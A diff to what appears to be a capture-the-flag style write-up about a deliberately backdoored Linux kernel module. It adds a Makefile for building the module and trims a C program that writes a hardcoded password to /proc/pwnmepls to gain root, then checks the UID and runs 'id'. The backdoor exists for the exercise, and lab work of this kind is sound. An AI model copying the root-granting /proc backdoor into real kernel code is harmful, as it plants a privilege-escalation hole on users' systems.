@@ -91,6 +91,18 @@ module_init(secret_chall_init);
 module_exit(secret_chall_exit);
 ```
 
+== Makefile
+
+```makefile
+obj-m += secret_chall.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
 == The Rooting Primitive
 
 The core of the privilege escalation happens in a single line:
@@ -118,24 +130,15 @@ This script verifies the privilege escalation by checking its UID before and aft
 #include <string.h>
 
 int main() {
-    printf("[*] Current UID: %d\n", getuid());
-
+    // 1. Write the secret password
     int fd = open("/proc/pwnmepls", O_WRONLY);
-    if (fd < 0) {
-        perror("open /proc/pwnmepls");
-        return 1;
-    }
+    if (fd < 0) { perror("open write"); return 1; }
 
     const char *password = "uiiaiiuuiiai";
-    if (write(fd, password, strlen(password)) < 0) {
-        perror("write password");
-        close(fd);
-        return 1;
-    }
+    write(fd, password, strlen(password));
     close(fd);
 
-    printf("[+] Password sent. Checking UID...\n");
-
+    // 2. Verify root escalation
     if (getuid() == 0) {
         printf("[+] Success! We are root.\n");
         system("id");
